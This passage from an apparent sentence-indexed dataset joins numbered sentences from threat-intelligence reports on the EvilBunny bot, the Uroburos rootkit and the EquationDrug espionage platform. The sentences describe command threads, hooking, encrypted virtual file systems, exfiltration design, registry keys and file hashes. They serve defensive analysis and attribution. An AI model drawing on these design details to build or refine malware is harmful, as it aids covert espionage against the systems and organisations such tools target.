written to the file are status messages including a time stamp , which are returned by command and Lua script execution .", "665": "The data is encrypted using the response_key from the configuration .", "666": "The term ' hearer ' can be found plenty of times in the binary , it is assumed that it is equivalent to ' listener ' of some sort .", "667": "All together suspect # 4 manages 4 hearer threads including one command file per thread .", "668": "The command file is named net.capX , where X is the index of the thread ; 0 , 1 , 3 or 4 .", "669": "Such instructions are commands and/or one or more Lua scripts .", "670": "Each hearer has a dedicated method to receive instructions which is either separately via HTTP from the server , aggregated through a downloaded data file or as tasks to be configured as scheduled tasks .", "671": "The hearer threads dump the received instructions to their net.cap-files , from where the main thread 's command parsing routine fetches and executes them .", "672": "The data is encrypted with the storage_key before written to disk .", "673": "Generic hearer thread .", "674": "Started , but not involved in command fetching and parsing .", "675": "These are encrypted with the storage_key and stored to net.cap1 in the malware 's working directory .", "676": "Interestingly , the malware handles successful downloads with the HTTP status code 418 .", "677": "This code is not part of the original HTTP standard , but was introduced in RFC2324 , 1998 's traditional IETF April Fool 's joke .", "678": "The textual representation of status 418 is \" I 'm a teapot . \" .", "679": "Hearer 2 is responsible for managing the scheduled tasks , titled ' crontasks ' by the malware .", "680": "The tasks are stored in a file named perf.tmp , and when due for execution are copied to the according net.cap-file , net.cap2 in this case .", "681": "From there the main thread can fetch and execute them in its command parsing loop .", "682": "Hearer 2 also creates a swap file named perf.tmp2 , which helps in selectively editing the initial task file and in managing the task list .", "683": "Hearer 3 searches for a file named netdump.db in its local working directory .", "684": "Again , the data is encrypted with the storage_key .", "685": "After initializing and starting all four hearer threads the main thread enters a command parsing loop .", "686": "For every hearer the main thread invokes the command and script execution function .", "687": "Therefor data is read from the encrypted net.capX- file , where X indicates the index of the hearer ; 0 , 1 , 3 or 4 .", "688": "Once decrypted , this data is parsed to find valid C&C commands and / or valid Lua scripts to execute .", "689": "More details on command and script execution can be found in section 2.6 .", "690": "Notable is that the command parsing and execution happens in a serial fashion , while Lua script execution is handed over to dedicated threads .", "691": "Also , no direct relation between C&C commands and Lua script execution could be identified .", "692": "The most notable actions of the bot can be summarized as follows .", "693": "However , suspect # 4 does accept a list of hard coded commands to be sent by the C&C server .", "694": "The full list of C&C commands can be found below .", "695": "Every command execution function returns a status line , such as for example \" ftp command succeeded for : % s!\\n \" .", "696": "For hearer 1 and 3 the command parsing routine will additionally manage two continuous log files which are named Perflib_Perfdata41X.dat and Perflib_Perfdata_42X.dat , where X is the respective hearer thread 's index .", "697": "More specifically , command parsing will increment a global variable holding the total amount of executed commands and scripts .", "698": "This 4-byte value is appended to Perflib_Perfdata41X.dat before and Perlfib_Perfdata42X.dat after command execution .", "699": "This mechanism helps the botmaster to keep track of the bots activity on an infected host and could also be helpful in trouble shooting .", "700": "Suspect # 4 incorporates an interpreter for Lua 5.1 , LuaSocket 2.0.2 and C / Invoke Lua bindings .", "701": "Lua is a lightweight programming language designed as a scripting language which can be embedded into applications , providing a C API for doing so .", "702": "C bindings are provided through C / Invoke and enable Lua scripts to perform callbacks to C / C++ code .", "703": "This constellation can be found in many video game engines to provide polymorphic behavior in games .", "704": "Engine and game play features are injected through Lua scripts , which instrument the game engine code .", "705": "The Lua interpreter is very small , compiled roughly 180kB , thus can easily be integrated in an application .", "706": "The C / Invoke bindings enable Lua to be completely independent from the C / C++ application , so injected scripts can be pure Lua code .", "707": "A script , if delivered to one of the hearer threads , will be provided through the corresponding net.cap-file of the hearer along with a C&C command .", "708": "If a script is included in the data read from the net.cap-file , this is indicated by the start sentinel ' < $ ' .", "709": "Likewise , the end of a script is indicated by ' $ > ' .", "710": "Command execution goes hand in hand with Lua script execution , thus is dependent of the four hearer threads .", "711": "The work flow for each hearer per execution loop in the main thread is as follows .", "712": "This key name stands for enable limited user account .", "713": "When set to zero this key effectively disables UAC ( User Account Control ) .", "714": "The malware only requests the key value but does not change it .", "715": "The value is later used by a callback function named ' popenWin ' to decide on a way how a sub process should be started .", "716": "Options are via WMIC using wmic.exe , Microsoft CScript engine using cscript.exe or directly via spawning a command line through cmd.exe .", "717": "However , spawning sub processes is not the only feature which comes with Lua .", "718": "The Lua interpreter is a powerful code base which enables suspect # 4 to change functionality on the fly , as different scripts are downloaded and executed .", "719": "The scripts define the functionality as they perform callbacks to the C / C++ code in the malware binary .", "720": "The potential of the Lua interpreter can be investigated on the project homepage .", "721": "Due to the absence of C&C servers which hold the Lua scripts for the bot 's Lua interpreter the true nature of this feature remains unclear .", "722": "Throughout analysis and due to the help of Paul Rascagni res a number of binaries which relate to EvilBunny were identified .", "723": "The binaries share parts of source code , most notably is the identical API name obfuscation algorithm and respective key AB34CD77h .", "724": "The indicators of a relation among all samples or a subset of samples are the following .", "725": "Mentioned set of malware also shows parallels in coding style and structure .", "726": "However , it has to be pointed out that suspect # 4 without doubt sticks out in terms of complexity and functionality .", "727": "It is assumed that suspect # 4 was created by the same authors , but this can not be proved .", "728": "Four of the set of identified samples are identical in functionality and capability .", "729": "They possess respectable flooding capabilities and also provide remote access .", "730": "However , they do not support data stealing or any spying functionality .", "731": "Two more C&C domains were identified for this group .", "732": "Regarding the nature of the attack or the actor behind EvilBunny only vague conclusions can be drawn .", "733": "There has been public contemplation that the actor might be french and that the malware might be related to samples analyzed by the Canadian CSEC .", "734": "However , there hasn't been any hard evidence which links the attack to a group or a geographical location .", "735": "Attribution is a tricky task and assumptions must not be drawn easily .", "736": "For providing technical insights , support and if I remember right even water , coffee or occationally rum , I want to express my deepest gratitude to Morgan Marquis - Boire , Sebastien Larinier , Paul Rascagni res , Nicolas Brulez , Michael Shalyt and Inbar Raz .", "737": "Further I want to thank Fred Arbogast , Alexandre Dulaunoy , Raphael Vinot and the remaining organizing team of Hack.lu for their advice and effort , even in situations of widespread insomnia .", "738": "All of you \u2013 such wow , very awesome ; rock on ! [ 1 ] An Analysis Of CVE-2011 - 4369 http://blog.9bplus.com/analyzing-cve-2011-4369-part-one/ [ 2 ] ThreatExpert Report on c40e3ee23cf95d992b7cd0b7c01b8599 http://www.threatexpert.com/report.aspx?md5=c40e3ee23cf95d992b7cd0b7c01b8599 [ 3 ] How to disable UAC https://social.technet.microsoft.com / Forums / windowsserver / en - US/0aeac9d8 - 3591 - 4294- b13e-825705b27730/how - to - disable - uac [ 4 ] The Lua Project http://www.lua.org/ [ 5 ] The C / Invoke Project http://www.nongnu.org/cinvoke/ [ 6 ] Lua scriptable game engines ( Wikipedia ) http://en.wikipedia.org/wiki/Category:Lua-scriptable_game_engines [ 7 ] All file hashes related to the EvilBunny malware http://pastebin.com/7iedeFF5 [ 8 ] Hack.lu 2014 Keynote on TS / NOFORN http://www.slideshare.net/pinkflawd/tsnoforn [ 9 ] Quand les Canadiens partent en chasse de Babar http://www.lemonde.fr / international / article/2014/03/21/quand - les - canadiens - partent - en- chasse - de - babar_4387233_3210.html Marked in Grey is the data of sinkholes for the mentioned domains , currently operated by Kaspersky .", "739": "G Data refers to it as Uroburos , in correspondence with a string found in the malware 's code and following an ancient symbol depicting a serpent or dragon eating its own tail .", "740": "Uroburos is a rootkit , composed of two files , a driver and an encrypted virtual file system .", "741": "Its modular structure allows extending it with new features easily , which makes it not only highly sophisticated but also highly flexible and dangerous .", "742": "Uroburos ' driver part is extremely complex and is designed to be very discrete and very difficult to identify .", "743": "The development of a framework like Uroburos is a huge investment .", "744": "The development team behind this malware obviously comprises highly skilled computer experts , as you can infer from the structure and the advanced design of the rootkit .", "745": "We believe that the team behind Uroburos has continued working on even more advanced variants , which are still to be discovered .", "746": "This malware behavior is typical for propagation in networks of huge companies or public authorities .", "747": "The attackers expect that their target does have computers cut off from the Internet and uses this technique as a kind of workaround to achieve their goal .", "748": "Uroburos supports 32-bit and 64-bit Microsoft Windows systems .", "749": "Due to the complexity of this malware and the supposed spying techniques used by it , we assume that this rootkit targets governments , research institutes , or / and big companies .", "750": "Due to many technical details ( file name , encryption keys , behavior and more details mentioned in this report ) , we assume that the group behind Uroburos is the same group that performed a cyberattack against the United States of America in 2008 with a malware called Agent . BTZ .", "751": "Uroburos checks for the presence of Agent . BTZ and remains inactive if it is installed .", "752": "It appears that the authors of Uroburos speak Russian ( the language appears in a sample ) , which corroborates the relation to Agent . BTZ .", "753": "Furthermore , according to public newspaper articles , this fact , the usage of Russian , also applied for the authors of Agent . BTZ .", "754": "According to all indications we gathered from the malware analyses and the research , we are sure of the fact that attacks carried out with Uroburos are not targeting John Doe but high profile enterprises , nation states , intelligence agencies and similar targets .", "755": "The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed in this environment .", "756": "The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years .", "757": "At the current stage of the investigations it is unknown how Uroburos initially infiltrates high profile networks .", "758": "Many infection vectors are conceivable .", "759": "E.g.", "760": "spear phishing , drive - by - infections , USB sticks , or social engineering attacks .", "761": "The G Data SecurityLabs discovered the rootkit dubbed Uroburos during 2013 .", "762": "We decided to investigate in depth soon after we identified the following three interesting aspects .", "763": "Uroburos is a direct reference to the Greek word Ouroboros ( \u039f\u1f50\u03c1\u03bf\u03b2\u03cc\u03c1\u03bf\u03c2 ) .", "764": "The Ouroboros is an ancient symbol depicting a serpent or dragon eating its own tail .", "765": "The name of this rootkit is inspired by a plain text string available in several driver files : Ur0bUr()sGotyOu # Furthermore , we identified other references to the ancient serpent / dragon symbol within the rootkit 's code , for example the following strings .", "766": "Another interesting notion : The exact spelling , Uroburos , can even be found in a webcomic called Homestuck .", "767": "In this interactive webcomic , the reader / player needs two codes to receive virtual magic objects ( called juju ) .", "768": "Those two codes are in fact uROBuROS and UrobUros .", "769": "We can notice that the uppercase and lowercase character order matches the string found within the malware code .", "770": "The rootkit is basically composed of two files .", "771": "We identified several file names for the driver , for example : Ultra3.sys , msw32.sys , vstor32.sys .", "772": "We have encountered 32-bit and 64-bit driver versions .", "773": "The two binaries may be installed simultaneously on one system .", "774": "The file containing the virtual file system has a random name , followed by the extension .dat .", "775": "Furthermore , this file is located in the same directory as the driver file .", "776": "The installation directory does change , but we were able to identify the following pattern .", "777": "The malware 's persistence is established by the creation of a service which automatically executes during each startup of the system .", "778": "The driver uses inline patching to perform the hooks , which is a common way to perform this task .", "779": "Inline patching is carried out by modifying the beginning of a targeted system 's function in order to redirect the execution flow to a custom code before jumping back to the original function .", "780": "In the current case , the inline patching adds a new interrupt instruction ( int 0xc3 ) at the beginning of the hooked function .", "781": "Doing this , the malware adds malicious behavior to legitimate functions .", "782": "The main hooked functions are .", "783": "The Uroburos rootkit uses two virtual file systems \u2013 one NTFS file system and one FAT file system .", "784": "They are stored locally , on the infected machine .", "785": "This means that the victim 's computer contains an encrypted file , which , in reality , hosts another file system .", "786": "The virtual file systems are used as a work space by the attackers .", "787": "They can store third party tools , post - exploitation tools , temporary files and binary output .", "788": "The virtual file systems can be accessed through the devices \\Device\\RawDisk1 and \\Device\\RawDisk2 and the volume \\\\.\\Hd1 and \\\\.\\Hd2 .", "789": "The encryption used for the file systems is CAST-128 1 .", "790": "The respective encryption key is hardcoded within the driver file .", "791": "Once decrypted , the virtual file system is a classic NTFS volume , which can be simply accessed through the standard Microsoft file system APIs .", "792": "During our analysis , we identified several files the file systems contained .", "793": "The .bat scripts contain some net use commands to map a remote file server , netstat commands to have network information , system info commands to get a complete view of the system configuration .", "794": "1 http://en.wikipedia.org/wiki/CAST-128 Copyright 2014 G Data Software AG 6 G Data Red Paper February 2014 : Uroburos The queue file is the most interesting and complex part of the virtual file system .", "795": "Each message in the queue contains a unique ID , a type , a timestamp and content .", "796": "The content is also encrypted using the CAST-128 algorithm and the respective key is stored in a message , too .", "797": "The messages can contain the following information .", "798": "We found classic post - exploitation tools , used by a lot of different APT actors .", "799": "The following list provides an overview of the tools found in the virtual file system .", "800": "The driver injects several libraries into user land .", "801": "These libraries are stored in encrypted form in the queue file .", "802": "These files are used to create a kind of \" proxy \" between the kernel land and the user land .", "803": "The driver injects two noteworthy libraries .", "804": "If the infected system is a 64-bit system , Win32 is replaced by Win64 .", "805": "The libraries are very huge ( more than 150 functions ) and contain a lot of features .", "806": "They are able to manipulate the queue file from the user land .", "807": "Following , a list of functions dedicated to the queue management ( qm ) .", "808": "The libraries have the capability to create and manage a pcap 3 capture .", "809": "The libraries are furthermore used to exfiltrate data to the outside world , namely the attackers .", "810": "We identified several protocols to perform this task : generally , the configuration needed for each protocol is stored in the queue file and not within the library itself .", "811": "The rootkit supports GET and POST requests and proxy authentication , too .", "812": "The default URI is http://%s / default.asp but it is configurable .", "813": "The media type of the request is chosen from the following list .", "814": "The design chosen by the developers is truly efficient : to add a new protocol and a new capability , the attackers do not need to recompile ( or reinstall ) the entire rootkit .", "815": "They simply need to adjust the library and replace the library in the queue file with the adjusted one .", "816": "The library usage results in modularity well thought out .", "817": "Thanks to the protocol described previously , the attacker can even target victims not directly connected to the Internet .", "818": "The following figure shows an example of a network scheme we discovered in 2013 .", "819": "The targeted machine ( A ) is a machine with access to sensitive data , e.g.", "820": "a server .", "821": "The rootkit installed on the system opens a Microsoft named pipe and waits for an incoming connection .", "822": "This machine can be named \" spied - on node \" .", "823": "The second machine ( B ) is an office machine with the capability to connect to the Internet .", "824": "The rootkit is configured to connect to system ( A ) , with the help of the named pipe , and administrate the machine remotely .", "825": "This machine ( B ) could be named \" proxy node \" .", "826": "This peer - to - peer design is really efficient , scalable and resilient .", "827": "In case a \" proxy node \" is not available / detected , the attackers can use another infected one .", "828": "The advantage for the attackers : even if a security specialist finds one \" spied - on node \" , he can not easily find the \" proxy node \" , due to the fact that this node is a passive node .", "829": "Furthermore , the analyst does not automatically have the command and control URL .", "830": "In case of incident response , this design is complicated to apprehend and it is hard to contain the infection .", "831": "Due to the complexity of the Uroburos rootkit , we estimate that it was designed to target government institutions , research institutions or companies dealing with sensitive information as well as similar high - profile targets .", "832": "Concerning the attribution , we found some technical information which allows us to link the Uroburos rootkit to a cyber - attack against the United States of America , carried out in 2008 4 and , particularly , to the worm used by the attackers , called Agent . BTZ .", "833": "During this 2008 campaign , a USB stick was deliberately \" lost \" in the parking lot of the United States Department of Defense .", "834": "This USB stick contained malicious code and infected the military 's network .", "835": "The following leads make us link what we discovered during our analysis with the cyber - attack carried out in 2008 .", "836": "In an article published by Reuters , in 2011 , the journalist mentioned that \" U.S.", "837": "government strongly suspects that the original attack was crafted by Russian Intelligence . \" 5 We found Uroburos samples with a resource in Russian language .", "838": "In case someone from the audience of this report notices an infection caused by the Uroburos rootkit and needs help , would like to receive further technical information or would like to contribute any information about this case , please feel free to contact us by email using the following mailbox : intelligence@gdata.de The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed .", "839": "The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years .", "840": "The investment to develop a complete framework such as Uroburos is extremely high .", "841": "The developer team behind the development and the design of such an enhanced framework is really skilled .", "842": "We believe that , until today , the team behind Uroburos has developed an even more sophisticated framework , which still remains undiscovered .", "843": "The design is highly professional ; the fact the attackers use a driver and a virtual file system in two separate files which can only work in combination , makes the analysis really complicated .", "844": "One needs to have the two components to correctly analyze the framework .", "845": "The driver contains all of the necessary functionality and the file system alone simply can not be decrypted .", "846": "The network design is extraordinarily efficient , too ; for an incident response team , it is always complicated to deal with peer - to - peer infrastructure .", "847": "It is also hard to handle passive nodes , because one can not quickly identify the link between the different infected machines .", "848": "This kind of data stealing software is too expensive to be used as common spyware .", "849": "We assume that the attackers reserve the Uroburos framework for dedicated and critical targets .", "850": "This is the main reason why the rootkit was only detected many years after the suspected first infection .", "851": "Furthermore , we assume that the framework is designed to perform cyber espionage within governments and high profile enterprises but , due to its modularity , it can be easily extended to gain new features and perform further attacks as long as it remains undetected within its target .", "852": "There are some strong indications which suggest that the group behind Uroburos is the same as the one behind Agent . BTZ , which allegedly was part of an intelligence agency cyberattack targeting US military bases in 2008 .", "853": "Notable hints include the usage of the exact same encryption key then and now , as well as the presence of Russian language in both cases .", "854": "SHA256 : BF1CFC65B78F5222D35DC3BD2F0A87C9798BCE5A48348649DD271CE395656341 MD5 : 320F4E6EE421C1616BD058E73CFEA282 Filesize : 210944 For further information contact intelligence@gdata.de", "855": "( See full report here [ PDF][2 ] ) .", "856": "EquationDrug , which is still in use , dates back to 2003 , although the more modern GrayFish platform is being pushed to new victims .", "857": "The concept of a cyberespionage platform is neither new nor unique .", "858": "Other threat actors known to use such sophisticated platforms include Regin[4 ] and Epic Turla[5 ] .", "859": "The name \" EquationDrug \" or \" Equestre \" was assigned to this framework by Kaspersky Lab researchers .", "860": "The only reference left by the framework developers was a short string \" UR \" , as seen in several string artifacts left in the binaries .", "861": "The EquationDrug platform includes dozens of executables , configurations and protected storage locations .", "862": "Putting all the pieces of this puzzle together in the right order may take time for those who are not familiar with the platform .", "863": "The platform includes executables , configurations and protected storage locations # EquationAPT Tweet[6 ] The architecture of the whole framework resembles a mini - operating system with kernel - mode and user - mode components carefully interacting with each other via a custom message - passing interface .", "864": "The platform includes a set of drivers , a platform core ( orchestrator ) and a number of plugins .", "865": "Every plugin has a unique ID and version number that defines a set of functions it can provide .", "866": "Some of the plugins depend on others and might not work unless dependencies are resolved .", "867": "[ 7 ] Similar to popular OS kernel designs , such as on Unix - based systems , some of the essential modules are statically linked to the platform core , while others are loaded on demand .", "868": "The hypothesis that these attackers have been active since the 90s seems realistic # EquationAPT Tweet[9 ] The platform is started by the kernel mode driver component ( \" msndsrv.sys \" on Windows 2000 or above and \" mssvc32.vxd \" on Windows 9x ) .", "869": "The driver then waits for the system to start and initiates execution of the user - mode loader \" mscfg32.exe \" .", "870": "The loader then starts the platform 's central module ( an orchestrator ) from the \" mscfg32.dll \" module .", "871": "Additional drivers and libraries may be loaded by different components of the platform , either built - in or auxiliary .", "872": "The EquationDrug platform can be as sophisticated as a space station , but it appears to be of no use without its cyberespionage features .", "873": "This function is provided by plugin modules that are part of the massive framework described above .", "874": "We discovered dozens of plugins and each is a sophisticated element that can communicate with the core and become aware of the availability of other plugins .", "875": "The plugins we discovered probably represent just a fraction of the attackers ' potential .", "876": "Each plugin is assigned a unique plugin ID number ( WORD ) , such as 0x8000 , 0x8002 , 0x8004 , 0x8006 , etc .", "877": "All plugin IDs are even numbers and they all start from byte 0x80 .", "878": "The biggest plugin ID we have seen is 0x80CA .", "879": "To date , we have found 30 unique plugin IDs in total .", "880": "Considering the fact that the developers assigned plugin IDs incrementally , and assuming that other plugin IDs were assigned to modules that we have not yet discovered , it 's not hard to calculate that 86 modules have yet to be discovered .", "881": "86 modules have yet to be discovered # EquationAPT Tweet[10 ] The most interesting modules we have seen contain the following functionality .", "882": "During our research we paid attention to unique identifiers and codenames used by the developers in the malware .", "883": "[ 11 ] Some other interesting text strings include .", "884": "SkyhookChow Target SkyhookChow Payload Dissecorp Manual / DRINKPARSLEY/2008 - 09 - 30/10:06:46.468 - 04:00 VTT/82053737/STRAITACID/2008 - 09 - 03/10:44:56.361 - 04:00 VTT/82051410/LUTEUSOBSTOS/2008 - 07 - 30/17:27:23.715 - 04:00 STRAITSHOOTER30.ex _ BACKSNARF_AB25 c:\\users\\rmgree5\\co\\standalonegrok_2.1.1.1\\gk_driver\\gk_sa_driver \u2026 To install : run with no arguments Attempting to drop SFCriteria_Check failed ! SFDriver Error detected ! Uninstalling ...", "885": "Timeout waiting for the \" canInstallNow \" event from the implant - specific EXE ! Trying to call privilege lib ...", "886": "Hiding directory Hiding plugin ...", "887": "Merging plugin ...", "888": "Merging old plugin key ...", "889": "Could n't reset canInstallNowEvent ! Performing UR - specific pre - install ...", "890": "Work complete .", "891": "Merged transport manager state .", "892": "! ! SFConfig ! ! Some other names , such as kernel object and file names , abbreviations , resource code page and several generic messages , point to English - speaking developers .", "893": "Due to the limited number of such text strings it 's hard to tell reliably if the developers were native English speakers .", "894": "Link Timestamp Analysis We have gathered a reasonably large number of executable samples to which we have been able to apply link timestamp analysis .", "895": "A link timestamp is a 4-bytes value stored in an executable file header .", "896": "This value is automatically set by compiler software when a developer builds a new executable .", "897": "The value contains a detailed timestamp including minutes and even seconds of compilation time ( think of it as the file 's moment of birth ) .", "898": "Link timestamp analysis require the collection of the timestamps of all available executables , grouping them according to certain criteria , such as the hour or day of the week , and putting them on a chart .", "899": "Below are some charts built using this approach .", "900": "[ 14 ] Can we trust this information ? The answer is : not fully , because the link timestamp can be altered by the developer in a way that 's not always possible to spot .", "901": "However , certain indicators such as matching the year on the timestamp with the support of technology popular in that year leads us to believe that the timestamps were , at the very least , not wholly replaced .", "902": "Looking at this from the other side , the easiest option for the developer is to wipe the timestamp completely , replacing it with zeroes .", "903": "This was not found in the case of EquationDrug .", "904": "In fact , the timestamps look very realistic and match the working days and hours of a well - organized software developer from timezone UTC-3 or UTC-4 , if you assume that they come to work at 8 or 9 am .", "905": "The timestamps match the working days of software developer from timezone UTC-3 or UTC-4 # EquationAPT Tweet[17 ] And finally , in case you are wondering if the developers work on public holidays , you can check this for yourself against the full list of their working dates .", "906": "EquationDrug represents the main espionage platform from the Equation Group .", "907": "It 's been in use for over 10 years , replacing EquationLaser until it was replaced itself by the even more sophisticated GrayFish platform .", "908": "The EquationDrug case demonstrates an interesting trend : a growth in code sophistication # EquationAPT Tweet[18 ] The EquationDrug case demonstrates an interesting trend that we have been seeing while analyzing supposedly nation - state cyberattack tools : a growth in code sophistication .", "909": "It is clear that nation - state attackers are looking for better stability , invisibility , reliability and universality in their cyberespionage tools .", "910": "You can make a basic browser password - stealer or a sniffer within days .", "911": "However , nation - states are focused on creating frameworks for wrapping such code into something that can be customized on live systems and provide a reliable way to store all components and data in encrypted form , inaccessible to normal users .", "912": "While traditional cybercriminals mass - distribute emails with malicious attachments or infect websites on a large scale , nation - states create automatic systems infecting only selected users .", "913": "While traditional cybercriminals typically reuse one malicious file for all victims , nation - states prepare malware unique to each victim and even implement restrictions preventing decryption and execution outside of the target computer .", "914": "Nation - state attackers create automatic systems infecting only selected users # EquationAPT Tweet[19 ] Sophistication of the framework is what makes this type of actor different from traditional cybercriminals , who prefer to focus on payload and malware capabilities such as implementing a long list of custom third - party software credential database parsers .", "915": "The difference in tactics between cybercriminals and nation - state attackers appears to be due to relative resource availability .", "916": "It 's known that cybercriminals attempt to infect as many users as possible and that they can sometimes compromise hundreds of thousands of systems .", "917": "It would will take many years to check all those machines manually , analyzing who owns them , what data is stored on them , and what custom software they run .", "918": "Cybercriminals probably do n't even have enough disk space to collect all the potentially interesting data from the victims hit by their large scale infections .", "919": "That is why cybercriminals prefer to extract tiny chunks of the most important data ( credentials , credit card numbers , etc ) on the machine of the victim and transfer only few kilobytes from each compromised host .", "920": "Such data , when combined from all users , normally takes up gigabytes of disk space .", "921": "Nation - state attackers have sufficient resources to store as much data as they want .", "922": "They have access to virtually unlimited data storage .", "923": "However , they do n't need , and often try to avoid , infecting random users , for the obvious reason of avoiding attention and remaining invisible .", "924": "Implementing custom data format parsers in the malware not only does n't help them find all the valuable data on the victim 's machine , but may also attract extra attention from security software running on the system .", "925": "They mostly prefer to have a generic remote system management tool that can copy any information they might need even if it causes some redundancy .", "926": "However , copying large volumes of information might slow down network connection and attract attention , especially in some countries with poorly developed internet infrastructure .", "927": "To date , nation - state attackers have had to balance between these two poles : copying victims ' entire hard drives while stealing only tiny bits of passwords and keys .", "928": "Nation - state attackers use a remote system management tool that can copy any information they need # EquationAPT Tweet[20 ] Now , if you wonder why EquationDrug , a powerful cyberespionage platform , does n't provide all stealing capability as standard in its malware core , the answer is that they prefer to customize the attack for each one of their victims .", "929": "Only if they have chosen to actively monitor you and the security products on your machines have been disarmed , will you receive a plugin for the live tracking of your conversations or other specific functions related to your activities .", "930": "We believe modularity and customization will become a unique trademark of nation - state attackers in the future .", "931": "While some other checks will not pass on Windows 95 , the presence of this code means that this OS was supported in some earlier variants of the malware .", "932": "Considering this and the existence of components designed to run on Windows 9x ( such as VXD - files ) , as well as compilation timestamps dating back to early 2000s , the hypothesis that these attackers have been active since the 90s seems realistic .", "933": "This makes the current attacker an outstanding actor operating longer than any other in the field .", "934": "Kernel mode stage 0 ( Windows 9x ) - mssvc32.vxd MD5 0a5e9b15014733ee7685d8c8be81fb0d Size 6 710 bytes Format Linear Executable ( LE ) This VXD driver handles only two control messages : W32_DeviceIoControl and Dynamic_Init .", "935": "The DeviceIoControl part is not completely implemented and the driver is only able to check for some known control codes .", "936": "However it does nothing .", "937": "This handler looks more like a code stub rather than actual payload .", "938": "On the Dynamic_Init event , the driver retrieves the location of the user - mode loader executable from the following registry value .", "939": "[ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] Config If the value is not present in the registry , it uses the following fallback string hardcoded in the binary .", "940": "C:\\WINDOWS\\SYSTEM\\SVCHOST32.EXE Next , it installs a callback procedure using Windows function _ SHELL_CallAtAppyTime .", "941": "This is a standard trick that was used by developers in the 90s to initiate a call to DLL export in ring-3 from ring-0 in Windows 9x OS family .", "942": "% systemroot%\\system32\\mslog32.dat % systemroot%\\system32\\msperf32.dat ( default location ) The driver acts as the first stage of the EquationDrug platform on Windows 2000 + and implements rootkit functions for hiding the components of the platform .", "943": "Additionally , it implements a NDIS driver for filtering network traffic .", "944": "When started and initialized , the driver retrieves the location of the user - mode loader executable from the registry value .", "945": "[ HKLM\\System\\CurrentControlSet\\Services\\%driver name% ] Config The % driver name% is not hardcoded and is obtained dynamically from the current module name , which means that different instances may check different registry keys and this may not be a reliable way to check for infection .", "946": "The sample we analyzed used \" msndsrv \" as the % driver name% .", "947": "Next , it crafts and injects a shellcode in \" services.exe \" or \" winlogon.exe \" .", "948": "The shellcode is designed to spawn the loader process from the executable called \" mscfg32.exe \" .", "949": "The components of EquationDrug can modify the list of protected objects by sending DeviceIoControl messages to the driver .", "950": "[ HKLM\\System\\CurrentControlSet\\Services\\%driver name% ] 1 [ HKLM\\System\\CurrentControlSet\\Services\\%driver name% ] 2 These values are also protected by the rootkit .", "951": "They can be revealed by booting Windows in Safe Mode .", "952": "The driver contains the following unused strings .", "953": "\\\\.\\mailslot\\dskInfo Dissecorp User - mode loader - mscfg32.exe , svchost32.exe MD5 c3af66b9ce29efe5ee34e87b6e136e3a Size 22 016 bytes Format PE32 EXE Compiled 2008.01.23 14:26:05 ( GMT ) Location % System32%\\mscfg32.exe This module opens a unique event named \" D0385CB7-B834 - 45d1-A501 - 1A1700E6C34E \" .", "954": "If the event exists , it waits for 10 seconds and attempts to open a file whose name can be decrypted as \" \\\\.\\MSNDSRV \" .", "955": "If the device file is successfully opened , the code issues a device request with IOCTL code 0x80000194 and no parameters .", "956": "This module uses RC5 in CBC - like mode with a key length of 96-bit for string encryption .", "957": "Careful analysis reveals some bits of uninitialized memory found next to encryption key locations .", "958": "This is unused but partly meaningful memory , because it seems to contain short chunks of strings resembling some local filepaths : \" rver\\8 \" ( probably part of \" Server\\8 ... \" string ) \" LInj \" ( could be a part of \" DLLInjector \" or similar ) It 's apparent that some parts of the code were designed to run on Windows 9x , for example a call to RegisterServiceProcess Windows API function makes sense only on Windows 9x OS family , because this API function does n't exist on Windows NT platform .", "959": "The code contains strings , such as \" SkyhookChow Target \" , that are converted to GUID - like strings by calculating SHA1 hash and using its hexadecimal representation as a string .", "960": "The resulting strings are used as actual registry value names in [ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] registry key .", "961": "Sample registry value names .", "962": "Original String GUID - like registry value name SkyhookChow Target { B6F5CD13-A74D-8B82-A6AA-6FA1BE2484C1 - 6832DF06 } SkyhookChow Payload { F4CF0326 - 6DCD - EEC8 - 5323 - 01CEDB66741A - B55F6F12 } These registry values are encrypted using an RC5 algorithm using a hardcoded 1024-bit key with 24 rounds .", "963": "The registry value .", "964": "[ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] { F4CF0326 - 6DCD- EEC8 - 5323 - 01CEDB66741A - B55F6F12 } ( \" SkyhookChow Payload \" ) should contain the location of the orchestrator DLL file ( \" mscfg32.dll \" ) .", "965": "If the value is not present a default value \" % SYSTEM%\\mscfg32.dll \" is used .", "966": "The registry value .", "967": "[ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] { B6F5CD13-A74D-8B82- A6AA-6FA1BE2484C1 - 6832DF06 } ( \" SkyhookChow Target \" ) may contain the location of the executable file that will be used as a \" shell \" process for the orchestrator library .", "968": "If there is no \" SkyhookChow Target \" value or the specified executable fails to start , the module tries different failsafe locations of the programs that can be used instead .", "969": "When the parent process quits , it unloads the payload DLL and exits as well .", "970": "The rest of the logic relies on the loaded DLL in that new process .", "971": "See the description of the \" mscfg32.dll \" module below .", "972": "The module communicates with the Stage0/Rootkit driver \" msndsrv.sys \" by sending DeviceIoControl messages to the device \" \\\\.\\MSNDSRV \" .", "973": "It activates the rootkit for its own process , for the target process holding the orchestrator and for all the files involved .", "974": "Platform orchestrator - mscfg32.dll , svchost32.dll MD5 5767b9d851d0c24e13eca1bfd16ea424 Size 249 856 bytes Format PE32 DLL Compiled 2008.01.24 22:11:34 ( GMT ) Location % System%\\mscfg32.dll Creates mutex : \" 01C482BA - BD31 - 4874-A08B - A93EA5BCE511 \" , or terminates if one already exists .", "975": "Writes a timestamped log file to one of the following locations .", "976": "% SystemRoot%\\temp\\~yh56816.tmp C:\\Windows\\Temp\\~yh56816.tmp % Registry_SystemRoot_Value%\\temp\\~yh56816.tmp Value of [ HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys ] D The file \" ~yh56816.tmp \" retains the history of execution .", "977": "It comprises debug records of simple structure .", "978": "The Stage is an integer number starting from 1 .", "979": "This module spawns a new thread in the DllMain function which contains the main function body .", "980": "The procedure disables application error popups shown by the default exception handler .", "981": "This is probably done only in the \" Release \" version of the malware , because the following code generates exceptions that are reported to the user if application error popups are not disabled .", 